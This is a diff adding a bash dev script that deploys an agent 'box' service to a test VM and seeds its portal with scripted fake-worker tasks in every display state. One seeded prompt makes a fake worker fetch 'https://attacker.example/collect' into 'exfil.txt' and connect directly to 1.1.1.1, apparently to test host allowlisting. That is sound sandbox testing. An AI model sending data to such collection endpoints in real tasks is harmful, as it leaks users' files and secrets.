@@ -1,0 +1,57 @@
+#!/usr/bin/env bash
+# A box for portal work on the linuxbox test VM, beside the installed one: its own BOX_HOME, API port 7790 and
+# SpacetimeDB database, serving this checkout's portal/dist. Lima forwards the port: open http://127.0.0.1:7790
+# on linuxbox. It starts with tasks in every state the portal shows (all scripted, no model, test money only).
+#   portal/dev-box.sh            ship this checkout, start the box fresh and seed it
+#   portal/dev-box.sh dist       ship portal/dist only (the box serves files from disk, no restart)
+#   portal/dev-box.sh stop
+set -euo pipefail
+cd "$(dirname "$0")/.."
+vm() { /home/linuxbrew/.linuxbrew/bin/limactl shell --workdir / box -- "$@"; }
+dest=/opt/box-dev/portal-dev
+home=/var/lib/box-portal-dev
+port=7790
+
+stop="[ -f /run/box-portal-dev.pid ] && kill -9 -\$(cat /run/box-portal-dev.pid) 2>/dev/null; sleep 1; for u in \$(awk -F: '\$3>=30000 && \$3<40000 {print \$1}' /etc/passwd); do
+  [ -d $home/tasks/\${u#box-} ] && { pkill -KILL -u \$u; userdel \$u; } ; done 2>/dev/null || true
+  grep -o \" $home/[^ ]*\" /proc/mounts | sort -r | xargs -r -n1 umount -l; rm -rf $home
+  flock /run/lock/box-spacetime-cli.lock spacetime delete --server local -y box-portal-dev >/dev/null 2>&1 || true"
+
+case ${1:-} in
+  stop) vm sudo bash -c "$stop"; exit ;;
+  dist) tar -czf - portal/dist | vm sudo bash -c "rm -rf $dest/portal/dist && tar -xzf - -C $dest"; exit ;;
+esac
+
+git ls-files -co --exclude-standard | while IFS= read -r f; do [[ -e $f ]] && printf '%s\n' "$f"; done |
+  tar -czf - -T - | vm sudo bash -c "mkdir -p $dest && find $dest -mindepth 1 -maxdepth 1 ! -name node_modules -exec rm -rf {} + && tar -xzf - -C $dest"
+vm sudo bash -s <<EOF
+set -e
+$stop
+cd $dest
+lock=\$(sha256sum package-lock.json | cut -c1-16)
+[ -f node_modules/.lock-\$lock ] || { npm ci --omit=dev --no-audit --no-fund --loglevel=error && touch node_modules/.lock-\$lock; }
+mkdir -p $home/workspaces/home $home/workspaces/notes
+printf 'Groceries: 42.10\nPower: 61.00\n' > $home/workspaces/home/budget.csv
+printf '# Notes\n\nNothing yet.\n' > $home/workspaces/notes/notes.md
+chmod -R a+rwX $home/workspaces
+cp /etc/box/vault.env $home/vault.env && echo DEMO_SECRET=portal-dev-test >> $home/vault.env && chmod 600 $home/vault.env
+BOX_HOME=$home BOX_PORT=$port BOX_VAULT=$home/vault.env BOX_STDB_DB=box-portal-dev BOX_PROXY_PORT=auto \
+  BOX_PORTAL=$dest/portal/dist setsid nohup node --experimental-strip-types --disable-warning=ExperimentalWarning core/box.ts \
+  > $home/box.log 2>&1 < /dev/null &
+echo \$! > /run/box-portal-dev.pid
+for i in \$(seq 50); do curl -fs 127.0.0.1:$port/health >/dev/null && break; sleep 0.3; done
+task() { curl -fs 127.0.0.1:$port/api/tasks -H 'content-type: application/json' -d "\$1" | sed 's/.*"id":"\([^"]*\)".*/\1/'; }
+f='"worker":"fake","source":"portal-dev"'
+task '{"title":"Write the weekly notes",'"\$f"',"workspace":"notes","prompt":"write notes.md # Notes\nappend notes.md Groceries came in under budget.\nappend notes.md The deploy went out on Tuesday."}' >/dev/null
+task '{"title":"Tidy the budget sheet",'"\$f"',"prompt":"append budget.csv Internet: 55.00\nwrite summary.txt Three bills, 158.10 in total."}' >/dev/null
+sleep 2
+u=\$(task '{"title":"Rename the photo folders",'"\$f"',"prompt":"write photos.txt renamed 212 folders"}')
+sleep 1.5; curl -fs -X POST 127.0.0.1:$port/api/tasks/\$u/undo >/dev/null
+task '{"title":"Check the test server",'"\$f"',"prompt":"sleep 1\nfail The test server did not answer after 3 tries"}' >/dev/null
+task '{"title":"Find me a road bike",'"\$f"',"workspace":"notes","hosts":["example.com"],"prompt":"fetch http://example.com/ page.html\nsleep 4\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars."}' >/dev/null
+task '{"title":"Buy a GPU hour",'"\$f"',"tools":["example.spend"],"budgetCents":500,"prompt":"call example.spend {\"cents\":800,\"on\":\"a GPU hour\"}\nwrite gpu.txt booked"}' >/dev/null
+task '{"title":"Deploy the new build",'"\$f"',"prompt":"ask Deploy build 214 to the home server now?\nwrite deployed.txt yes"}' >/dev/null
+task '{"title":"Fix the failing test",'"\$f"',"prompt":"append progress.txt read the test\nsleep 2\nappend progress.txt found the bug\nsleep 900\nwrite fixed.txt yes"}' >/dev/null
+task '{"title":"Long job",'"\$f"',"prompt":"append progress.txt 1\nsleep 3\nappend progress.txt 2\nsleep 900\nappend progress.txt 3"}' >/dev/null
+echo "dev box up: http://127.0.0.1:$port (log: $home/box.log)"
+EOF
